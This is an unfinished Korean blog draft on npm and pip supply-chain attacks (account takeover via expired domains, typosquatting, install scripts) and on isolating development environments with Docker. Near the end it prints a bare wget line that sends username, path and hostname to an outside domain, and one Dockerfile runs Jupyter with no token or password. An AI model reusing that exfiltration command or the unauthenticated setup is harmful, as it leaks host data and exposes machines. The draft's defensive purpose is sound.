---
title: '안전한 개발환경을 만들어보자'
authors: [arch-spatula]
tags: ['docker', '보안', 'npm', 'pip']
description: '개발환경의 보안을 신경써봅시다.'
toc_max_heading_level: 6
draft: true
---

# 안전한 개발환경을 만들어보자

<!--truncate-->

<!-- 글쓰기 단계: draft -->

:::caution 주의

저는 보안 전문가가 아닙니다. 취미로 프로그래밍을 하고 주된 업무 분야가 아닌 것도 건드려보기 때문에 이 글을 쓰기 시작했습니다.

보안 조언으로 받아들이지 마시고 모든 책임은 본인에게 있습니다.

:::

## 배경

![](/img/2024-01-31/gilbert.jpeg)

> 인간이 잘하는 것이 하나 있다면 그것은 새로운 걱정거리를 찾는 것이다
>
> \- 넷플릭스 샌드맨의 길버트(Gilbert) ~~몇 화인지 모름~~

취업하고 배가 따시하기 시작하니까 저는 이제 새로운 걱정이 생겼습니다. 보안입니다.

공부 혹은 취미로 코딩하는데 언제든지 멀웨어가 설치될 수 있습니다. github 돌아다니면서 재미있어 보이면 설치해봅니다. 그 과정에 언제든이 멀웨어가 설치될 수 있습니다.

<iframe class="codepen" src="https://www.youtube.com/embed/DjfpcmK62ew" title="지금! 🚨 개발자라면 무조건 알아야하는 NPM 해킹" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>

더 정확히는 위 영상을 보면서 생겨난 의문들과 대응 방안들을 찾고자 이 글을 쓰기 시작했습니다. 또 npm에 docker 설정한다는 언제 알려줄지도 모릅니다. 마냥 기다리기는 싫어서 제가 다루고 싶어졌습니다.

## 공급망 공격

> 공격자가 기업(개발자)의 소프트웨어 설치 및 업데이트 배포 과정에 침입해 정상 소프트웨어인 것처럼 꾸민 악성 소프트웨어를 사용자 기기에 설치하는 방식
>
> \- 보안뉴스[^1]

공급망 공격은 패키지 생태계가 있는 모든 프로그래밍 언어는 해당합니다. 표준 라이브러리가 아닌 설치가 필요한 시점부터 모두 취약점입니다. 저간 [soydev](https://www.urbandictionary.com/define.php?term=Soydev)는 npm, pip에 의존을 많이 하고 있는데 설치할 때마다 저의 기계가 탈취될 가능성을 만드는 것입니다.

어느정도 오픈소스 커뮤니티에서 알려진 라이브러리를 사용하면 피해규모를 줄일 수 있을 것이라고 많이 착각합니다. 피해자가 많으면 대응하려는 사람이 많으니까 비교적 안전할 것이고 PR에 보안문제를 만드는 것을 통과시킬 가능성은 낮겠죠? 우리는 안일합니다. 언제든지 메인테이너는 [변절(Compromised)](https://www.spymuseum.org/education-programs/spy-resources/language-of-espionage/#Compromised)할 수 있습니다. 구글은 알리바바에게 매각당하고 개인정보 백도어를 언제 만들지 모릅니다. ~~[알루미늄 모자](https://namu.wiki/w/%EC%9D%80%EB%B0%95%20%EB%AA%A8%EC%9E%90)는 내려 놓고~~

공급망 공격은 모든 언어와 플랫폼에게 있습니다. 차이는 있지만 모두취약합니다.

<!-- ### 발생할 수 있는 최대 피해 -->

<!-- 이메일 노출 -->
<!-- 디렉토리 노출 -->
<!-- 환경 변수 노출 -->
<!-- 기계 저장한 정보 노출 -->
<!-- RAT Remote Access Trojan -->

### npm Account 공격

1. npm 패키지 중에서 커스텀 도메인이 만료된 계정을 찾습니다.
2. 도메인을 구매합니다.
3. 도메인을 활용해서 비밀번호 초기화 이메일 보내기
4. 비밀번호가 초기화 된 이메일 탈취
5. 패키지를 탈취 후 멀웨어 업로드
6. 사일런트 업데이트

이 공격이 유효할 수 있는 이유들이 있습니다. 하나는 npm이 host 권한으로 모든 것을 실행해주기 때문입니다. ~~또 라이언 달의 실수입니다.~~ 다른 하나는 npm은 자체적으로 auth를 다루고 있기 때문입니다. 자체적으로 auth를 다룰 때 문제는 도메인의 만료 때입니다. npm은 사용자의 인증을 관리하지 사용자의 이메일을 관리하지 않습니다. 이렇게 보면 github, gitlab 같은 원격 레포서비스 이메일로 가입을 요구하는 것이 합리적으로 보입니다.

**언제든지 퍼블리셔의 계정이 탈취**당할 수 있습니다. 우리는 이 취약점을 항상 기억해야 합니다. 메인테이너가 해커에게 동조할지도 모르고 관심이 없어서 PR에서 지나 쳤을 수 있습니다.

![](/img/2024-01-31/npm-pic.png)

npm 가입 페이지입니다.

이메일을 google, github 같은 계정을 절대 활용하고 있지 않습니다. 최소한 이메일 인증을 지원하고 있습니다. 심지어 비밀번호 확인 `input`도 없습니다. ~~input 2개 요구하는 이유가 가입할 때 틀리는 거 방지하려는 것입니다. 이게 중요한 것은 아니구요~~

이런 이메일 탈취는 개인이 노력하고 MFA(Multi-Factor Authentication)를 활용 하는 방안이 있습니다. 하지만 모든 사용자가 이렇게 도입할 것이라고 장담할 수 없습니다.

능동적으로 취할 방어전략이 크게 없습니다. npm에 의존하고 있는 동안 항상 취약점에 열려있다고 봐야 합니다. 최소한의 패키지만 설치하고 설치 전에 베스트 프랙티스에 맞는지 확인해야 합니다. 메인테이너 팀이 코드 리뷰를 꼼꼼하게 하는 프로세스가 있는지 확인하는 것도 필요할 것입니다. 그렇게 해도 사람을 실수를 하게 될 것입니다. 또 패키지 설치에 선택지가 너무 많이 줄어들 것입니다. 나중에 node 혹은 bun에 보안 취약점을 알려 줄 수 있을 때까지 기다리는 방법은 너무 수동적입니다. 이것과 마찬가지로 npm 공급망 공격시도가 비효율적이라 공격시도를 자제하게 만는 방법도 있지만 이것도 수동적입니다. 본인이 보안과 관련해서 능력이 있다면 직접 audit하는 방법도 있을 것입니다. 현재 저는 그런 지식과 능력이 없습니다.

설치를 하면 node module을 확인해보고 거기에 수상한 파일이 있는지 확인해봐야 합니다. 쉘 확장자가 있는지 특이한 실행파일이 있는지 파악해야 합니다.

<!-- 이 공격 경로는 퍼블리셔의 계정을 통합니다. -->

<!-- 이 공격 경로는 이렇게 글로만 보면 이해가 안 될 것입니다. -->

<!-- 제일먼저 정찰활동입니다. 우리는 첩보자산을 확보해야 합니다. 자산을 확보하기 위해서는 자산을 평가하고 선정해야 합니다.

1. 높은 다운로드 수를 갖고 있음
2. 커스텀 도메인을 갖고 있음
3. 커스텀 도메인을 구매가 가능해야 함

높은 다운로드 수를 갖고 있으면 그만큼 공격할 수 있는 대상이 많다는 뜻입니다. 상대방에게 가할 수 있는 최대 피해규모 기준으로 자산의 가치를 평가가가 가능합니다.

자산의 가치를 평가를 하면 취득이 가능해야 합니다. 자산 취득은 2, 3이 좌우합니다.

npm만의 고유한 특성입니다. -->

### Typosquatting Attack

인간의 실수를 바라고 만드는 공격입니다. 직접 타이핑을 하는 상남자들이 많은데 저같은 하남자들은 공식 홈페이지에서 코드 스니펫 클릭하고 설치합니다.

```sh
npm create vite@latest
```

위는 일반적인 vite 설치 명령입니다. 여기서 어순 오타 버전을 추가해주면 됩니다.

```sh
npm create viet .
npm create vtie .
npm create ivte .
npm create ivet .
```

이런 오타를 노리고 패키지를 설치하기 바라는 전략입니다. 비교적 방어 전략이 단순합니다. 저랑 같이 하남자가 되면 됩니다.

### 패키지 피싱

노마드 코더는 Math JS로 목차를 달아 뒀는데 저는 패키지 피싱이 이라는 제목이 생각났습니다.

공식 라이브러리의 다른 버전인척 흉내내는 전략입니다. 접두어 접미어를 붙여서 다른 버전인 것처럼 보이려고 합니다.

```sh
npm create vite-min .
```

예시를 들면 위와 같습니다. 접미사로 min을 붙이거나 어떤 접두어를 붙이는 것입니다. 물론 이것에 대한 방어 전략은 그냥 같은 퍼블리셔인지 확인만 하면 됩니다. 이것도 비교적 방어 적략이 단순합니다.

### Installation Scripts

<!-- @todo: 위험한 shell 명령 -->

npm의 문제점 중 하나입니다. `pre-install`과 `post-install`을 실행합니다.

설치 작업 전후로 사용자에게 권한 체크를 요구하지 않습니다. Deno는 귀찮게 요구합니다. 랜더링 라이브러리인데 네트워크 요청을 시도하면 멀웨어가 설치된 패키지라는 것을 알 수 있습니다. 반면 npm은 그냥 모두 실행합니다.

이런 명령이 왜 문제가 되는가? 실제로 자바스크립트 명령만 실행하는 것이 아니기 때문입니다. 퍼블리셔는 host 권한으로 커맨드라인을 직접 제어할 수 있습니다. 이렇게 되면 문제는 npm을 통해서 설치 할 수 없던 멀웨어를 커맨드라인을 통해서 설치하게 만드는 것입니다.

현재 [npm 베스트 프랙티스](https://docs.npmjs.com/cli/v9/using-npm/scripts#best-practices)는 아니라고 해서 많은 라이브러리 개발자들이 피하기 시작했습니다.

피하기는 해도 정당한 이유로 필요한 경우들이 있습니다. 자바스크립트 크롤러 중 하나인 [Puppeteer](https://pptr.dev/)는 [공식 레포](https://github.com/puppeteer/puppeteer/blob/main/package.json)를 들어가보면 postinstall을 실행시키는 것을 확인할 수 있습니다.

react도 post install을 실행합니다.

https://blog.sandworm.dev/dissecting-npm-malware-five-packages-and-their-evil-install-scripts

Deno가 하는 짓거리 보고 Node 팀에서도 의식하기 시작했습니다. 20 버전부터는 실험적으로 지원을 시작했습니다.

방어 전략은 pre-install, post-install을 하는지 레포에서 파악하고 설치를 처리합니다. 그리고 설치를 할 때 무슨 명령을 하는지 라이브러리 코드를 독해하는 능력을 길러야 합니다.

sandworm-audit을 실행하면 된다고 하는데 사실 잘 모릅니다.

<!-- @todo: sandworm-audit 실습 -->

## Dockerize로 기계 방어

Docker를 사용하는 이유는 로컬 기계에서 서로 격리시키기 때문입니다. 도커 컨테이너 내에 모두 설치하고 컨테이너를 종료하면 삭제하는 것으로 방어합니다. 설치된 파일이 컨테이너 내부에서 실행되고 있기 때문에 기계 전체를 접근하기는 어렵습니다.

개발하는 로컬환경에서도 이렇게 Docker를 사용하는 것이 좋습니다.

한계도 있습니다.

- 설치하는 스크립트가 Docker 외부 컨택스트로 접근할 수 있다면 결국 소용없습니다.
  - 설치한 코드가 운영체제를 타겟팅하고 메모리를 부패시키는 것입니다(저도 정확히 무슨 소리하는지 모릅니다.).
- 피해가 컨테이너 내부라고 할 뿐이지 컨테이너 내부에도 중요한 정보들이 있습니다.
  - 환경변수(`.env`파일)와 관련된 개인정보는 탈취당할 수 있습니다.

그럼에두 불구하고 AWS에 올리지 않는다고 가정하고 Docker를 활용하는 방법을 소개하겠습니다. 실습예제는 Python, Javascript, Go 3가지 언어별로 패키지 관리방식마다 다루겠습니다.

1. Dockerfile
2. 이미지
3. 컨테이너

위 순서를 암기하기 바랍니다. 이전 작업에 의존합니다. docker를 사용할 때 CLI로 컨테이너를 바로 띄울 수 있습니다. 하지만 띄우는 명령을 매번 입력하기는 귀찮은 것이 많습니다. 다른 사람과 공유하려면 image를 공유할 수 있습니다. 회사 혹은 프로젝트가 갖고 있는 특별한 니즈가 있으면 Dockerfile로 만들어서 커스터마이징이 필요할 것입니다. 우리는 커스터마이징 아랫 단계부터 시작하겠습니다.

<!-- docker를 사용할 때 관건은 Dockerfile을 만들고 Docker 파일로 이미지를 만들고 이미지로 Docker 컨테이너를 만드는 것입니다. -->

<!-- Docker를 어느정도 이해해야 Docker를 사용해서 개발환경을 설정할 수 있습니다. 도커라이징을 하는 것입니다. -->

### Docker CLI 실습

docker 설치는 알아서 하시고 진행해 주시기 바랍니다. 그냥 알아서 하라고 하면 불친절한 것 같아서 [여기 링크](https://docs.docker.com/get-docker/)는 남겨드리겠습니다.

뭐 설치가 끝났으면 이제 공식 문서 링크들을 남겨드리겠습니다. 2가지 관점이 있는데 이론관점하고 실습관점입니다. 저는 비전공에 머리가 나빠서 핸즈온으로 먼저 뭐 해보고 다음에 다시 이론을 보면 이해가 더 잘 됐던 것 같습니다. [래퍼런스 공식문서](https://docs.docker.com/reference/)의 목차부터 잘 보기 바랍니다. 특히 [docker run 커맨드](https://docs.docker.com/engine/reference/commandline/run/)를 자세히 확인하기 바랍니다.

```sh
docker run --rm -it ubuntu:16.04 /bin/bash
```

알아서 설치하셨으면 위명령을 시도해보기 바랍니다.

`--rm`은 종료 후 삭제를 의미합니다.

`-it`은 내부로 들어간다는 의미였던 것 같습니다. `-i`, `-t` 플래그 2개를 합친 것입니다. `-i`은 Interactive를 의미합니다. `-t`은 TTY이고 본딧말은 전신타자기(TeleTYpewriter)을 의미합니다. 표준 입력이 가능하도록 연결했다고 생각하면 됩니다.

<!-- @todo: 2개의 플래그를 같이 사용해야 하는 이유 설명  -->

`/bin/bash`은 우분투(리눅스의 종류)를 예시로 사용하는데 리눅스의 특징입니다. 리눅스 컨테이너 내에서 bash 쉘을 활성화한 것입니다.

위 명령을 하면 터미널에 본인이 설정했던 하이라이팅이 사라졌다는 것을 보게 될 것입니다. 컨테이너 내부에 있기 때문에 격리되었다는 것입니다. 호스트 운영체제에 설정해놨던 것들을 가져오지 않습니다. 이것은 `-it` 플래그로 컨테이너가 활성화 되었을 때 컨테이너 내부로 접근할 수 있게 해줍니다.

```sh
ls # bin  boot  dev  etc  home  lib  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
```

`ls` 명령을 하면 주석과 비슷한 결과를 보게 될 것입니다. 우분투 컨테이너에서 설치하면서 같이 받은 것입니다. 이렇게 되면 컴퓨터는 하나지만 운영체제는 2개를 사용하는 것과 같아집니다.

```sh
exit
```

위 명령을 하고 docker 데스크탑을 한번 확인하기 바랍니다. 돌고 있던 컨테이너가 자동적으로 꺼졌을 것입니다.

### pip 실습

python 개발자가 백엔드 서버를 만들거나 아니면 재테크를 위해 데이터 분석을 시도하고 있다면 시도해볼 만합니다.

docker를 사용하기 시작하면 python에서 가상환경을 설정한다는 것은 웃깁니다. 컨테이너가 가상환경인데 가상환경 속에서 가상환경을 사용한다는 것이 웃길 것 같습니다.

#### 데이터 사이언스를 위한 패키지 구성

<!-- @주피터 노트북 -->

https://jupyter.org/install

pip install jupyterlab

```txt title="requirements.txt"
jupyterlab
numpy
pandas
```

```Dockerfile
# 파이썬 최신 버전을 런타임으로 활용
FROM python:3.11

# @todo: WORKDIR에 대해서 설명추가하기
WORKDIR /root

COPY ./requirements.txt /root/requirements.txt

# @todo: --no-cache-dir --upgrade -r 설명추가하기
RUN pip install --no-cache-dir --upgrade -r /root/requirements.txt

EXPOSE 8888

CMD ["jupyter", "lab", "--ip=0.0.0.0", "--port=8888", "--NotebookApp.token=''", "--NotebookApp.password=''"]
```

```sh
docker build -t my-ds .
```

```sh
docker run --rm -p 8888:8888 my-ds
```

<!-- --no-cache-dir 플래그는 무엇인가요? -->
<!-- -r 플래그는 무엇인가요? -->

#### fast api

근본있게 장고를 사용하기는 해야 하지만 저는 근본이 부족해서 fast api를 사용하겠습니다.

```Dockerfile
FROM python:3.11

WORKDIR /code

COPY ./requirements.txt /code/requirements.txt

RUN pip install --no-cache-dir --upgrade -r /code/requirements.txt

COPY ./app /code/app

CMD ["uvicorn", "app.main:app", "--host", "0.0.0.0", "--port", "80", "--reload"]
```

```txt title="requirements.txt"
fastapi
uvicorn
```

<!-- @todo: 디렉토리 설정도 보여주세요 -->

일단 위는 [fastapi 공식 문서](https://fastapi.tiangolo.com/ko/deployment/docker/?h=docker)에서 알려주는 docker 설정을 가져왔습니다. 뒤에 `--reload`만 추가했습니다. 컨테이너를 띄우면 실제로 코드 수정마다 업데이트 될 것입니다. ~~하지만 자동 완성 뽕맛을 잃을 것입니다.~~

Dockerfile의 내용을 모두 이해해봅시다.

제일먼저 FROM 명령입니다. 이 명령은 베이스 이미지를 지정하는 명령입니다.

dev container를 플러그인을 설치합니다. 여기서 2가지 전략이 있습니다. attache to container 와 reopen in container 입니다.

저의 경우 reopen in container가 잘 동작했습니다.

```sh
docker build -t fast-docer-image .
```

<!-- -t 플래그는 무엇을 의미하는가? -->

```sh
docker run --name fast-backend -p 80:80 fast-docer-image
```

```sh
docker run --name fast-backend -p 80:80 -d -v $(pwd):/code fast-docer-image
```

<!-- -v 플래그는 무엇인가? -->

docker는 가상화를 해줍니다. 컨테이너라고 운영체제와 독립적인 프로세스를 만들고 네트워크도 가상화를 시켜줍니다. 위에서 볼 것은 포트번호입니다. 컨테이너 내부에서 통신하기 위한 포트번호라고 생각하면 됩니다. 오른쪽은 컨테이너 내부 포트번호이고 왼쪽은 우리가 접근할 포트번호입니다. http는 기본적으로 80번이면 숨겨줍니다. https는 443번이면 숨겨줍니다. 왜 이 번호인지 찾아보니까 남는 거 줬다고 했습니다.

이 명령을 설명해보세요.

작업을 내부에서 처리하려면 볼륨 설정을 해줘야 합니다.

How to create a great dev environment with Docker

https://www.youtube.com/watch?v=0H2miBK_gAk

https://kwon-eb.tistory.com/81

여기서 의문입니다. devcontainer는 어떻게 우리의 컨테이너를 알고 설정해줄 수 있던 것인가?

<!-- https://www.youtube.com/embed/Jx39roFmTNg -->

### npm

순수하게 npm을 사용하기에는 아쉬운 점이 많아 yarn, pnpm도 다루겠습니다. ~~bun은 좋지만 싫어요~~

### go mod

저는 모든 언어가 취약하다고 가정합니다. 심지어 go 언어도 취약하다고 생각합니다. 보안 취약점 문제를 갖고 있다고 생각합니다.

### docker의 한계

docker는 보안의 만능 해결책이 아닙니다. 먼저 docker 자체도 취약합니다. docker image 87%가 클라우드 리서치팀에서 취약하다고 보고 했습니다.

docker 이미지를 직접 만들어도 한계가 있습니다. docker는 격리만 해줄 뿐입니다. 멀웨어 실행파일의 활동 범위를 제한할 수 있어도 완전히 차단한 것은 아닙니다. 또 설치 중에 결국에는 `.env`를 탈취하려는 스크립트를 실행합니다. 기계에 발생할 수 있는 취약점만 줄여줄 뿐입니다.

패키지를 받는 방식에 따라 다릅니다. golang은 패키지를 root 디렉토리에 받습니다. 그렇기 때문에 실행하면 위험이 많습니다. deno도 이와 비슷한 정책입니다.

### 그렇다고 docker가 안전한가?

결론은 아닙니다.

<iframe class="codepen" src="https://www.youtube.com/embed/1PBXB3RcDLs" title="What's really inside your docker containers?" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>

What's really inside your docker containers?

## sandworm

npm에 대해서는 조금더 근본적인 해결책을 찾고 싶었습니다.

```sh
wget --quiet "https://curetosec.online/?user=$(whoami)&path=$(pwd)&hostname=$(hostname)"
```

<!-- [LLM 전두엽 제거수술](https://www.youtube.com/watch?v=GyllRd2E6fg&pp=ygUIZmlyZXNoaXA%3D)을 하려는데 AI 수술대 AWS를 위한 `.env` 정보가 털린다거나 하는 것은 흔합니다. -->

<!-- 바로 저의 보안 취약점입니다. 저는 언제 해킹당할지 모른다는 생각을 갖고 있습니다. 언제 저도 모르게 저의 컴퓨터에 키로거(key logger)가 설치 되어 있고 원격서버에 실시간으로 전송할지 모른다는 생각을 갖고 있습니다. 클립보드에 이상한 값이 들어오면 바로 swap할 것이라는 생각을 갖고 있습니다. 가끔 휴대폰을 확인하면서 어디서 로그인 시도가 발생했는지 걱정하고 있습니다. 극단적으로 MFA가 뚤렸다는 생각도 갖고 있습니다. -->

<!-- 하지만 모든 것들은 생각입니다. 지금 현재 갖고 있는 지식에서 이 보안을 하나둘씩 대응하기에는 지식이 부족합니다. -->

[^1]: [[카드뉴스] ‘최근 가장 뜨거운 보안 이슈’, 공급망 공격](https://m.boannews.com/html/detail.html?mtype=3&tab_type=H&idx=122516)
